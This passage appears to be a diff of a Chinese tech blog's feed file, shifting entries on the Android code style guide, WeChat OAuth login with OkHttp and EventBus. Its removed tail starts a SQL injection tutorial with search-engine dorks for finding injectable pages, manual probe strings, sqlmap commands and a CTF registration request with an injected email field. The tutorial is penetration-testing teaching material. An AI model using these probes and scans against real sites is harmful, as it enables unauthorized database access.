+<p>如果您的TODO的形式是“在未来的日期做某事”，请确保您包括一个非常具体的日期（“修复在2005年11月”）或一个非常具体的事件（“删除此代码之后所有生产混音师理解协议V7 。“）。  </p>
+<p>16.日志节制  </p>
+<p>虽然记录是必要的，但它对性能具有显着的负面影响，并且如果不保持合理的简短，则快速失去其有用性。日志记录工具提供五个不同级别的日志记录：  </p>
+<p>ERROR：当发生致命事件时使用，即某些会有用户可见的后果，并且如果没有显式删除某些数据，卸载应用程序，擦除数据分区或重新整理整个设备（或更糟），将无法恢复。此级别始终记录。在ERROR级别上证明某些日志记录的问题通常是被报告给统计信息收集服务器的好候选。  </p>
+<p>WARNING：在发生严重和意外事件时使用，即某些会有用户可见的后果，但可能通过执行一些明确的操作来恢复，而不会丢失数据，从等待或重新启动应用程序到重新下载新版本的应用程序或重新启动设备。此级别始终记录。在WARNING级别进行某些日志记录的问题也可能被考虑用于向统计信息收集服务器报告。  </p>
+<p>INFORMATIVE: 使用注意到，大多数人发生了有趣的事情，即当检测到可能具有广泛影响的情况时，虽然不一定是错误。这样的条件只能由合理地认为它是该域中最具权威性的模块记录（以避免非授权组件的重复日志记录）。此级别始终记录。  </p>
+<p>DEBUG：用于进一步注意设备上可能与调查和调试意外行为相关的内容。你应该只记录需要什么来收集有关你的组件发生什么的足够的信息。如果你的调试日志主导日志，那么你可能应该使用详细日志记录。  </p>
+<p>此级别将被记录，即使在发布版本上，并且需要被一个if (LOCAL_LOG)或if (LOCAL_LOGD) 块包围，其中LOCAL_LOG[D]在类或子组件中定义，因此可能存在禁用所有此类日志记录的可能性。因此，在if (LOCAL_LOG)块中必须没有活动逻辑。所有用于日志的字符串构建也需要放置在if (LOCAL_LOG)块内。如果它将导致字符串构建在if (LOCAL_LOG)块之外发生，则日志调用不应该重新映射到方法调用中。<br>还有一些代码仍然说if (localLOGV)。这也被认为是可接受的，虽然名称是非标准的。  </p>
+<p>VERBOSE：用于一切。此级别将仅在调试版本上记录，并且应由if (LOCAL_LOGV)块（或等效的）包围，因此可以默认编译出来。任何字符串构建将从发布版本中删除，并需要显示在if (LOCAL_LOGV)块内。<br>笔记：  </p>
+<p>在给定的模块中，除了VERBOSE级别之外，只有在可能的情况下才应报告错误。在模块内的单个函数调用链中，只有最内层函数应该返回错误，并且同一模块中的调用者应该只添加一些日志，如果这显着帮助隔离问题。  </p>
+<p>在一个模块链中，除了VERBOSE级别以外，当低级模块检测到来自高级模块的无效数据时，低级模块只应将此情况记录到DEBUG日志中，并且仅当日志记录提供对呼叫者不可用的信息。具体来说，不需要记录抛出异常的情况（异常应包含所有相关信息），或者记录的唯一信息包含在错误代码中。这在框架和应用程序之间的交互中尤其重要，由框架正确处理的第三方应用程序引起的条件不应该触发高于DEBUG级别的日志记录。  </p>
+<p>当通常证明某些日志记录可能发生多次的条件时，实施一些速率限制机制以防止用相同（或非常相似）信息的许多重复副本来溢出日志是一个好主意。  </p>
+<p>网络连接的损失被认为是常见的，完全预期的，不应该被无偿地记录。在应用程序中发生后果的网络连接丢失应在DEBUG或VERBOSE级别记录（取决于后果是否足够严重，并且意外足以登录到发布版本中）。<br>在可由第三方应用程序访问或代表第三方应用程序访问的文件系统上具有完整的文件系统不应该记录在高于INFORMATIVE的级别。  </p>
+<p>来自任何不受信任的源（包括共享存储上的任何文件或来自任何网络连接的数据）的无效数据被认为是预期的，并且当检测到无效时，不应该在高于DEBUG的级别触发任何日志记录日志记录应尽可能有限）。  </p>
+<p>请记住，+在字符串上使用运算符时，隐式创建一个StringBuilder具有默认缓冲区大小（16个字符）和可能的其他临时String对象，即显式创建StringBuilders不比依赖于默认的’+’运算符更昂贵（事实上​​可以更高效）。请记住，调用的代码Log.v()在发布版本上编译和执行，包括构建字符串，即使日志没有被读取。  </p>
+<p>任何意图被其他人读取并在发布版本中可用的日志记录应该是简洁的，而不是含糊的，并且应该是可以理解的。这包括所有登录到DEBUG级别。  </p>
+<p>如果可能，记录应该保持在一行，如果有意义。线长度最多可达80或100个字符是完全可以接受的，如果可能，应避免长度大于约130或160个字符（包括标签的长度）。  </p>
+<p>不应使用高于VERBOSE的级别记录报告成功的日志。  </p>
+<p>用于诊断难以重现的问题的临时日志应该保存在DEBUG或VERBOSE级别，并且应该包含在允许在编译时完全禁用它的块。<br>小心日志中的安全漏洞。应避免私人信息。必须避免有关受保护内容的信息。这在编写框架代码时尤其重要，因为事先不容易知道什么将是和不会是私人信息或受保护的内容。  </p>
+<p>System.out.println()（或printf()本地代码）永远不要使用。System.out和System.err被重定向到/ dev / null，所以你的打印语句将没有可见的效果。然而，对于这些调用发生的所有字符串构建仍然被执行。  </p>
+<p>记录的黄金规则是，您的日志可能不会不必要地将其他日志推出缓冲区，就像其他人可能不会推出您的日志。  </p>
+<p>17.始终一致  </p>
+<p>我们分开的想法：一致。如果您正在编辑代码，请花几分钟时间查看周围的代码并确定其样式。如果该代码使用if子句周围的空格，你也应该。如果代码注释在他们周围有一些星星框，那么你的评论也有一些星星。  </p>
+<p>有风格指导的要点是有一个通用的编码词汇，所以人们可以专注于你在说什么，而不是你如何说。我们在这里提出全球风格规则，所以人们知道词汇，但本地风格也很重要。如果你添加到一个文件的代码看起来与现有的代码有很大的不同，当读者阅读它时，它会使读者脱离他们的节奏。尝试避免这一点。  </p>
+<p>18.Javatests样式规则<br>按照测试方法命名约定，使用下划线将要测试的内容与要测试的特定案例分开。这种风格使得更容易查看正在测试的案例。例如：  </p>
+<p>testMethod_specificCase1 testMethod_specificCase2</p>
+<p>void testIsDistinguishable_protanopia() {<br>    ColorMatcher colorMatcher = new ColorMatcher(PROTANOPIA)<br>    assertFalse(colorMatcher.isDistinguishable(Color.RED, Color.BLACK))<br>    assertTrue(colorMatcher.isDistinguishable(Color.X, Color.Y))<br>}</p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+        <tag>code_standard</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android微信第三方登录2</title>
+    <url>/post/273860866.html</url>
+    <content><![CDATA[<p>利用http与微信通信换取用户信息和openid<br>使用了okhttp作为http通信的框架  </p>
+<hr>
+<ol>
+<li><p>首先实例化okhttp连接  </p>
+<p> <code>private final OkHttpClient client = new OkHttpClient();</code></p>
+</li>
+</ol>
+<h6 id="获得code"><a href="#获得code" class="headerlink" title="获得code"></a>获得code</h6><pre><code>case BaseResp.ErrCode.ERR_OK:
+//      可用以下两种方法获得code
+//      resp.toBundle(bundle);
+//      Resp sp = new Resp(bundle);
+//      String code = sp.code;
+//      或者
+String code = ((SendAuth.Resp) baseResp).code;
+String state = ((SendAuth.Resp) baseResp).state;
+Toast.makeText(getApplicationContext(), &quot;恭喜这是你的code&quot; + code, Toast.LENGTH_LONG).show();
+Log.e(TAG, &quot;onResp: &quot; + code);
+try {
+    getAccess_token(code);
+} catch (Exception e) {
+    e.printStackTrace();
+}
+//上面的code就是接入指南里要拿到的code
+break;
+</code></pre><hr>
+<h6 id="根据code获取用户信息"><a href="#根据code获取用户信息" class="headerlink" title="根据code获取用户信息"></a>根据code获取用户信息</h6><pre><code>private void getAccess_token(String code) throws Exception {
+    String url = &quot;https://api.weixin.qq.com/sns/oauth2/access_token?&quot; +
+            &quot;appid=&quot; + ConfigUtil.Wechat_Appid +
+            &quot;&amp;secret=&quot; + ConfigUtil.Wechat_AppSecret +
+            &quot;&amp;code=&quot; + code +
+            &quot;&amp;grant_type=authorization_code&quot;;
+    run(url);
+}
+</code></pre><hr>
+<h6 id="引入okhttp包"><a href="#引入okhttp包" class="headerlink" title="引入okhttp包"></a>引入okhttp包</h6><p><img src="http://upload-images.jianshu.io/upload_images/2590671-e535b2d91c6473b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="引入okhttp的包"></p>
+<pre><code>//通过http与微信通信
+public void run(String url) throws Exception {
+final Request request = new Request.Builder()
+        //.url(&quot;http://publicobject.com/helloworld.txt&quot;)
+        .url(url)
+        .get()
+        .build();
+
+client.newCall(request).enqueue(new Callback() {
+    @Override
+    public void onFailure(Call call, IOException e) {
+        e.printStackTrace();
+    }
+
+    @Override
+    public void onResponse(Call call, Response response) throws IOException {
+        if (!response.isSuccessful()) throw new IOException(&quot;Unexpected code &quot; + response);
+        try {
+            String responseStr=response.body().string();
+            JSONObject jsonObject = new JSONObject(responseStr);
+            System.out.println(TAG + jsonObject.getString(&quot;access_token&quot;));//在回调中获取access_token
+        } catch (JSONException e) {
+            e.printStackTrace();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+
+    }
+});
+}
+</code></pre><h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><p>如果微信调不起来<br>仔细检查签名是否正确<br>如果修改过签名<br>可以重新安装下微信再试一下  </p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+        <tag>weixin</tag>
       </tags>
   </entry>
   <entry>
@@ -10929,227 +11150,6 @@ protected void initData() {
       </tags>
   </entry>
   <entry>
-    <title>android EventBus 使用</title>
-    <url>/post/3369655730.html</url>
-    <content><![CDATA[<p>2017 10 27<br>EventBus是什么？<br>首先有两个概念发布者/订阅者  </p>
-<p>发布者就是 发送事件<br>订阅者 就是接收事件  </p>
-<pre><code>gradle
-
-compile &#39;org.greenrobot:eventbus:3.0.0&#39;
-</code></pre><p>1.定义事件</p>
-<pre><code>
-// 定义事件 这个就是你要传送的数据实体类
-public static class MessageEvent { /* Additional fields if needed */ }
-</code></pre>
-
-
-<p>2.准备订阅者</p>
-<pre><code>
-@Subscribe(threadMode = ThreadMode.MAIN)  
-public void onMessageEvent(MessageEvent event) {/* Do something */};
-
-// 订阅者 接受数据的方法 threadMode  是运行在什么线程模式
-http://greenrobot.org/eventbus/documentation/delivery-threads-threadmode/
-</code></pre>
-
-<p>注册和取消注册订阅者</p>
-<pre><code> @Override
- public void onStart() {
-     super.onStart();
-     EventBus.getDefault().register(this);
- }
-
- @Override
- public void onStop() {
-     super.onStop();
-     EventBus.getDefault().unregister(this);
- }
-</code></pre><p>3.发送事件</p>
-<pre><code>`EventBus.getDefault().post(new MessageEvent());`
-</code></pre>]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-        <tag>eventbus</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android微信第三方登录2</title>
-    <url>/post/273860866.html</url>
-    <content><![CDATA[<p>利用http与微信通信换取用户信息和openid<br>使用了okhttp作为http通信的框架  </p>
-<hr>
-<ol>
-<li><p>首先实例化okhttp连接  </p>
-<p> <code>private final OkHttpClient client = new OkHttpClient();</code></p>
-</li>
-</ol>
-<h6 id="获得code"><a href="#获得code" class="headerlink" title="获得code"></a>获得code</h6><pre><code>case BaseResp.ErrCode.ERR_OK:
-//      可用以下两种方法获得code
-//      resp.toBundle(bundle);
-//      Resp sp = new Resp(bundle);
-//      String code = sp.code;
-//      或者
-String code = ((SendAuth.Resp) baseResp).code;
-String state = ((SendAuth.Resp) baseResp).state;
-Toast.makeText(getApplicationContext(), &quot;恭喜这是你的code&quot; + code, Toast.LENGTH_LONG).show();
-Log.e(TAG, &quot;onResp: &quot; + code);
-try {
-    getAccess_token(code);
-} catch (Exception e) {
-    e.printStackTrace();
-}
-//上面的code就是接入指南里要拿到的code
-break;
-</code></pre><hr>
-<h6 id="根据code获取用户信息"><a href="#根据code获取用户信息" class="headerlink" title="根据code获取用户信息"></a>根据code获取用户信息</h6><pre><code>private void getAccess_token(String code) throws Exception {
-    String url = &quot;https://api.weixin.qq.com/sns/oauth2/access_token?&quot; +
-            &quot;appid=&quot; + ConfigUtil.Wechat_Appid +
-            &quot;&amp;secret=&quot; + ConfigUtil.Wechat_AppSecret +
-            &quot;&amp;code=&quot; + code +
-            &quot;&amp;grant_type=authorization_code&quot;;
-    run(url);
-}
-</code></pre><hr>
-<h6 id="引入okhttp包"><a href="#引入okhttp包" class="headerlink" title="引入okhttp包"></a>引入okhttp包</h6><p><img src="http://upload-images.jianshu.io/upload_images/2590671-e535b2d91c6473b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="引入okhttp的包"></p>
-<pre><code>//通过http与微信通信
-public void run(String url) throws Exception {
-final Request request = new Request.Builder()
-        //.url(&quot;http://publicobject.com/helloworld.txt&quot;)
-        .url(url)
-        .get()
-        .build();
-
-client.newCall(request).enqueue(new Callback() {
-    @Override
-    public void onFailure(Call call, IOException e) {
-        e.printStackTrace();
-    }
-
-    @Override
-    public void onResponse(Call call, Response response) throws IOException {
-        if (!response.isSuccessful()) throw new IOException(&quot;Unexpected code &quot; + response);
-        try {
-            String responseStr=response.body().string();
-            JSONObject jsonObject = new JSONObject(responseStr);
-            System.out.println(TAG + jsonObject.getString(&quot;access_token&quot;));//在回调中获取access_token
-        } catch (JSONException e) {
-            e.printStackTrace();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-
-
-    }
-});
-}
-</code></pre><h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><p>如果微信调不起来<br>仔细检查签名是否正确<br>如果修改过签名<br>可以重新安装下微信再试一下  </p>
-]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-        <tag>weixin</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android 代码样式规范</title>
-    <url>/post/208407023.html</url>
-    <content><![CDATA[<p>原文地址 把重点记录下<br><a href="https://source.android.com/source/code-style.html" target="_blank" rel="noopener">https://source.android.com/source/code-style.html</a></p>
-<p>1.不要忽略异常(空的catch字句)  </p>
-<p>  不要不捕获异常  </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-d9e8766c47552fe2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="推荐方式"></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-f182ce0036e28095.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="推荐方式"></p>
-<p>2.不要使用Findlizer  </p>
-<p>Finalizer是一种在对象被垃圾回收时执行一段代码的方法。虽然他们可以方便地进行清理（特别是外部资源），但是没有保证什么时候调用终结器（甚至会被调用）。  </p>
-<p>Android不使用finalizer。在大多数情况下，您可以从具有良好异常处理的终结器中完成所需的操作。如果你绝对需要它，定义一个close（）方法（或类似的），并准确地记录该方法需要被调用时（见InputStream的例子）。在这种情况下，只要不希望溢出日志，就可以打印来自终结器的短日志消息，但不是必需的。  </p>
-<p>3.Java库规则  </p>
-<p>旧的代码使用旧的库 在创建新的组件不要使用不推荐使用的库  </p>
-<p>有使用Android的Java库和工具的约定。在某些情况下，约定以重要的方式发生了变化，较旧的代码可能使用已弃用的模式或库。当使用这样的代码，可以继续现有的风格。但是，在创建新组件时，不要使用不推荐使用的库。  </p>
-<p>4.Java风格规则  </p>
-<p>使用Javadoc标准注释  </p>
-<p>每个文件应在顶部有一个版权声明，其后是package和import语句（每个块由空行分隔），最后是类或接口声明。在Javadoc注释中，描述类或接口的作用。  </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-a2b0703f23b915d5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="注释规范"></p>
-<p>你写的每个类和公共方法必须包含一个Javadoc注释，至少有一个句子描述类或方法的作用。这句话应以第三人称描述性动词开始。  </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-cf5bed56f9efa6b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="注释规范"></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-1e56e232fb5d1867.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="注释规范"></p>
-<p>如何为javadoc编写注释 [<a href="http://www.oracle.com/technetwork/java/javase/documentation/index-137868.html]" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/documentation/index-137868.html]</a>  </p>
-<p>5.写短的方法  </p>
-<p>如果一个方法超过40行左右，考虑它是否可以分解而不伤害程序的结构。  </p>
-<p>6.在标准位置定义字段  </p>
-<p>在文件的顶部或在使用它们的方法之前定义字段。  </p>
-<p>7.限制变量范围  </p>
-<p>将局部变量范围保持最小<br>循环变量应在for语句本身中声明  </p>
-<p>8.次序导入语句  </p>
-<p>  android import<br>  第三方 import<br>  java 和 javax  </p>
-<p>9.使用缩进空格<br>我们使用四（4）个空格缩进块，而不是制表符。当有疑问时，要与周围的代码一致。  </p>
-<p>我们使用八（8）个空格缩进进行换行，包括函数调用和赋值。例如，这是正确的：  </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-f7ba99e90aa951eb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="缩进"></p>
-<p>10.遵循字段命名约定  </p>
-<p>非公共，非静态字段名以m开头。<br>静态字段名称以s开头。<br>其他字段以小写字母开头。<br>公共静态最终字段（常量）为ALL_CAPS_WITH_UNDERSCORES。  </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-bb7f60ad6182be61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="命名规范"></p>
-<p>11.使用标准括号样式<br>大括号不要自己一行; 大括号和代码在同一行：  </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-2a03544c67f34cbf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="标准括号"></p>
-<p>我们需要在条件语句周围添加括号。异常：如果整个条件（条件和主体）适合一行，你可以（但没有义务）把它全部放在一行上。例如，这是可以接受的：  </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-851b61c733681703.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="括号规范"></p>
-<p>12.限制线长度  </p>
-<p>代码中的每行文字长度最多为100个字符。虽然许多讨论都围绕这个规则，但是决定仍然是100个字符是最大值，以下例外：  </p>
-<p>如果注释行包含示例命令或长度超过100个字符的文字URL，则该行可能长于100个字符，以便于剪切和粘贴。<br>导入行可以超过限制，因为人们很少看到它们（这也简化了工具写入）。<br>使用标准Java注释  </p>
-<p>注释应该在同一语言元素的其他修饰符之前。简单的标记注释（例如@Override）可以与语言元素列在同一行。如果有多个注释或参数化注释，它们应按字母顺序逐行列出。  </p>
-<p>13.使用标准Java注释  </p>
-<p>注释应该在同一语言元素的其他修饰符之前。简单的标记注释（例如@Override）可以与语言元素列在同一行。如果有多个注释或参数化注释，它们应按字母顺序逐行列出。  </p>
-<p>Java中的三个预定义注释的Android标准实践是：  </p>
-<p>@Deprecated：当不建议使用注释元素时，必须使用@Deprecated注释。如果使用@Deprecated注释，则还必须具有@deprecated Javadoc标记，并且应该命名替代实现。此外，请记住，一个@Deprecated方法 仍然应该工作。如果您看到旧代码带有@deprecated Javadoc标记，请添加@Deprecated注释。<br>@Override：当方法从超类覆盖声明或实现时，必须使用@Override注释。例如，如果使用@inheritdocs Javadoc标记，并从类（而不是接口）派生，则还必须注释该方法@覆盖父类的方法。<br>@SuppressWarnings：@SuppressWarnings注释只应在不可能消除警告的情况下使用。如果警告通过此“不可能消除”测试，则必须使用@SuppressWarnings注释，以确保所有警告都反映代码中的实际问题。<br>当需要@SuppressWarnings注释时，必须以TODO注释作为前缀，解释“不可能消除”条件。这通常会识别具有尴尬界面的违规类。例如：  </p>
-<p>// TODO: The third-party class com.third.useful.Utility.rotate() needs generics<br>@SuppressWarnings(“generic-cast”)<br>List<string> blix = Utility.rotate(blax);<br>当需要@SuppressWarnings注释时，应重构代码以隔离应用注释的软件元素。  </string></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-0ed9e09a961a4e04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="注释"></p>
-<p>14.将首字母缩略词作为词  </p>
-<p>将缩写词和缩写词作为命名变量，方法和类中的单词，以使名称更易读：  </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-9176c57a4abf2d68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="命名"></p>
-<p>由于JDK和Android代码库在首字母缩略词之间非常不一致，因此几乎不可能与周围的代码一致。因此，始终将首字母缩写作为词。  </p>
-<p>15.使用TODO注释  </p>
-<p>使用TODO注释代码是临时的，短期的解决方案，或者足够好但不完美的代码。TODO应在所有大写字母中包含字符串TODO，后跟冒号：  </p>
-<p>  // TODO: Remove this code after the UrlTable2 has been checked in.</p>
-<p>和</p>
-<p>  // TODO: Change this to use a flag instead of a constant.</p>
-<p>如果您的TODO的形式是“在未来的日期做某事”，请确保您包括一个非常具体的日期（“修复在2005年11月”）或一个非常具体的事件（“删除此代码之后所有生产混音师理解协议V7 。“）。  </p>
-<p>16.日志节制  </p>
-<p>虽然记录是必要的，但它对性能具有显着的负面影响，并且如果不保持合理的简短，则快速失去其有用性。日志记录工具提供五个不同级别的日志记录：  </p>
-<p>ERROR：当发生致命事件时使用，即某些会有用户可见的后果，并且如果没有显式删除某些数据，卸载应用程序，擦除数据分区或重新整理整个设备（或更糟），将无法恢复。此级别始终记录。在ERROR级别上证明某些日志记录的问题通常是被报告给统计信息收集服务器的好候选。  </p>
-<p>WARNING：在发生严重和意外事件时使用，即某些会有用户可见的后果，但可能通过执行一些明确的操作来恢复，而不会丢失数据，从等待或重新启动应用程序到重新下载新版本的应用程序或重新启动设备。此级别始终记录。在WARNING级别进行某些日志记录的问题也可能被考虑用于向统计信息收集服务器报告。  </p>
-<p>INFORMATIVE: 使用注意到，大多数人发生了有趣的事情，即当检测到可能具有广泛影响的情况时，虽然不一定是错误。这样的条件只能由合理地认为它是该域中最具权威性的模块记录（以避免非授权组件的重复日志记录）。此级别始终记录。  </p>
-<p>DEBUG：用于进一步注意设备上可能与调查和调试意外行为相关的内容。你应该只记录需要什么来收集有关你的组件发生什么的足够的信息。如果你的调试日志主导日志，那么你可能应该使用详细日志记录。  </p>
-<p>此级别将被记录，即使在发布版本上，并且需要被一个if (LOCAL_LOG)或if (LOCAL_LOGD) 块包围，其中LOCAL_LOG[D]在类或子组件中定义，因此可能存在禁用所有此类日志记录的可能性。因此，在if (LOCAL_LOG)块中必须没有活动逻辑。所有用于日志的字符串构建也需要放置在if (LOCAL_LOG)块内。如果它将导致字符串构建在if (LOCAL_LOG)块之外发生，则日志调用不应该重新映射到方法调用中。<br>还有一些代码仍然说if (localLOGV)。这也被认为是可接受的，虽然名称是非标准的。  </p>
-<p>VERBOSE：用于一切。此级别将仅在调试版本上记录，并且应由if (LOCAL_LOGV)块（或等效的）包围，因此可以默认编译出来。任何字符串构建将从发布版本中删除，并需要显示在if (LOCAL_LOGV)块内。<br>笔记：  </p>
-<p>在给定的模块中，除了VERBOSE级别之外，只有在可能的情况下才应报告错误。在模块内的单个函数调用链中，只有最内层函数应该返回错误，并且同一模块中的调用者应该只添加一些日志，如果这显着帮助隔离问题。  </p>
-<p>在一个模块链中，除了VERBOSE级别以外，当低级模块检测到来自高级模块的无效数据时，低级模块只应将此情况记录到DEBUG日志中，并且仅当日志记录提供对呼叫者不可用的信息。具体来说，不需要记录抛出异常的情况（异常应包含所有相关信息），或者记录的唯一信息包含在错误代码中。这在框架和应用程序之间的交互中尤其重要，由框架正确处理的第三方应用程序引起的条件不应该触发高于DEBUG级别的日志记录。  </p>
-<p>当通常证明某些日志记录可能发生多次的条件时，实施一些速率限制机制以防止用相同（或非常相似）信息的许多重复副本来溢出日志是一个好主意。  </p>
-<p>网络连接的损失被认为是常见的，完全预期的，不应该被无偿地记录。在应用程序中发生后果的网络连接丢失应在DEBUG或VERBOSE级别记录（取决于后果是否足够严重，并且意外足以登录到发布版本中）。<br>在可由第三方应用程序访问或代表第三方应用程序访问的文件系统上具有完整的文件系统不应该记录在高于INFORMATIVE的级别。  </p>
-<p>来自任何不受信任的源（包括共享存储上的任何文件或来自任何网络连接的数据）的无效数据被认为是预期的，并且当检测到无效时，不应该在高于DEBUG的级别触发任何日志记录日志记录应尽可能有限）。  </p>
-<p>请记住，+在字符串上使用运算符时，隐式创建一个StringBuilder具有默认缓冲区大小（16个字符）和可能的其他临时String对象，即显式创建StringBuilders不比依赖于默认的’+’运算符更昂贵（事实上​​可以更高效）。请记住，调用的代码Log.v()在发布版本上编译和执行，包括构建字符串，即使日志没有被读取。  </p>
-<p>任何意图被其他人读取并在发布版本中可用的日志记录应该是简洁的，而不是含糊的，并且应该是可以理解的。这包括所有登录到DEBUG级别。  </p>
-<p>如果可能，记录应该保持在一行，如果有意义。线长度最多可达80或100个字符是完全可以接受的，如果可能，应避免长度大于约130或160个字符（包括标签的长度）。  </p>
-<p>不应使用高于VERBOSE的级别记录报告成功的日志。  </p>
-<p>用于诊断难以重现的问题的临时日志应该保存在DEBUG或VERBOSE级别，并且应该包含在允许在编译时完全禁用它的块。<br>小心日志中的安全漏洞。应避免私人信息。必须避免有关受保护内容的信息。这在编写框架代码时尤其重要，因为事先不容易知道什么将是和不会是私人信息或受保护的内容。  </p>
-<p>System.out.println()（或printf()本地代码）永远不要使用。System.out和System.err被重定向到/ dev / null，所以你的打印语句将没有可见的效果。然而，对于这些调用发生的所有字符串构建仍然被执行。  </p>
-<p>记录的黄金规则是，您的日志可能不会不必要地将其他日志推出缓冲区，就像其他人可能不会推出您的日志。  </p>
-<p>17.始终一致  </p>
-<p>我们分开的想法：一致。如果您正在编辑代码，请花几分钟时间查看周围的代码并确定其样式。如果该代码使用if子句周围的空格，你也应该。如果代码注释在他们周围有一些星星框，那么你的评论也有一些星星。  </p>
-<p>有风格指导的要点是有一个通用的编码词汇，所以人们可以专注于你在说什么，而不是你如何说。我们在这里提出全球风格规则，所以人们知道词汇，但本地风格也很重要。如果你添加到一个文件的代码看起来与现有的代码有很大的不同，当读者阅读它时，它会使读者脱离他们的节奏。尝试避免这一点。  </p>
-<p>18.Javatests样式规则<br>按照测试方法命名约定，使用下划线将要测试的内容与要测试的特定案例分开。这种风格使得更容易查看正在测试的案例。例如：  </p>
-<p>testMethod_specificCase1 testMethod_specificCase2</p>
-<p>void testIsDistinguishable_protanopia() {<br>    ColorMatcher colorMatcher = new ColorMatcher(PROTANOPIA)<br>    assertFalse(colorMatcher.isDistinguishable(Color.RED, Color.BLACK))<br>    assertTrue(colorMatcher.isDistinguishable(Color.X, Color.Y))<br>}</p>
-]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-        <tag>code_standard</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>网络课程列表</title>
     <url>/post/378823961.html</url>
     <content><![CDATA[<p>edx：<br>edX是麻省理工和哈佛大学于2012年4月联手创建的大规模开放在线课堂平台。它免费给大众提供大学教育水平的在线课堂。两所大学在这个非盈利性计划各资助三千万美元。2012年秋天，edX在MITx启动。<br><a href="https://www.edx.org/course" target="_blank" rel="noopener">https://www.edx.org/course</a><br><a href="https://www.edx.org/edxchina" target="_blank" rel="noopener">https://www.edx.org/edxchina</a>  </p>
@@ -11332,165 +11332,6 @@ python --version
       <tags>
         <tag>python</tag>
         <tag>pyenv</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>1.1.1-SQL注入-SQL注入基础-SQL注入流程</title>
-    <url>/post/820776471.html</url>
-    <content><![CDATA[<h3 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h3><h4 id="01-寻找SQL注入点"><a href="#01-寻找SQL注入点" class="headerlink" title="01 寻找SQL注入点"></a>01 寻找SQL注入点</h4><h5 id="寻找SQL注入点"><a href="#寻找SQL注入点" class="headerlink" title="寻找SQL注入点"></a>寻找SQL注入点</h5><p>无特定目标：<br>inurl:.php?id=  </p>
-<p>有特定目标：<br>inurl:.php?id=site:target.com<br>// jsp sid   </p>
-<p>工具爬取：<br>spider,对搜索引擎和目标网站的链接进行爬取  </p>
-<p><strong>注入识别</strong><br>手工简单识别：  </p>
-<pre><code>&#39;
-and 1=1 / and 1=2
-and &#39;1&#39;=&#39;1 / and &#39;1&#39;=&#39;2 
-and 1 like 1 / and 1 like 2
-</code></pre><p>工具识别：  </p>
-<pre><code>sqlmap -m filename (filename中保存检测目标)
-sqlmap --crawl(sqlmap对目标网站进行爬取，然后依次进行测试)
-</code></pre><p><strong>高级识别：</strong><br>扩展识别广度和深度：  </p>
-<pre><code>SqlMap --level 增加测试级别，对header中相关参数也进行测试
-sqlmap -r filename (filename中为网站请求数据)
-</code></pre><p>利用工具提高识别效率：</p>
-<pre><code>BurpSuite + SqlMap
-BurpSuite拦截所有浏览器访问提交的数据
-BurpSuite扩展插件，直接调用SqlMap进行测试
-</code></pre><p>一些Tips：  </p>
-<p>可以在参数后键入“*” 来确定想要测试的参数<br>可能出现注入的点：新闻、登录、搜索、留言… …<br>站在开发的角度去寻找  </p>
-<hr>
-<pre><code>python sqlmap.py -r 1.txt
-</code></pre><p>burp sqlmap 扩展<br>Burp-&gt; Extender-&gt;BApp Store -&gt; SQLiPy Sqlmap  </p>
-<p><strong>代码审计：</strong></p>
-<p>搜索关键代码和函数<br>梳理业务流程  </p>
-<p>强网杯WEB “python is the best language”  </p>
-<pre><code>http://test.com/register  
-POST:  
-
-username=test&amp;email=t@t.com&amp;password=123&amp;password2=123&amp;submit=Register  
-username=test&amp;email=t@t.com&#39; and &#39;1&#39; = &#39;1&amp;password=123&amp;password2=123&amp;submit=Register  
-</code></pre><h4 id="02-SQL注入流程"><a href="#02-SQL注入流程" class="headerlink" title="02 SQL注入流程"></a>02 SQL注入流程</h4><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/01.png" alt=""></p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/02.png" alt=""></p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/03.png" alt=""></p>
-<p>数据获取</p>
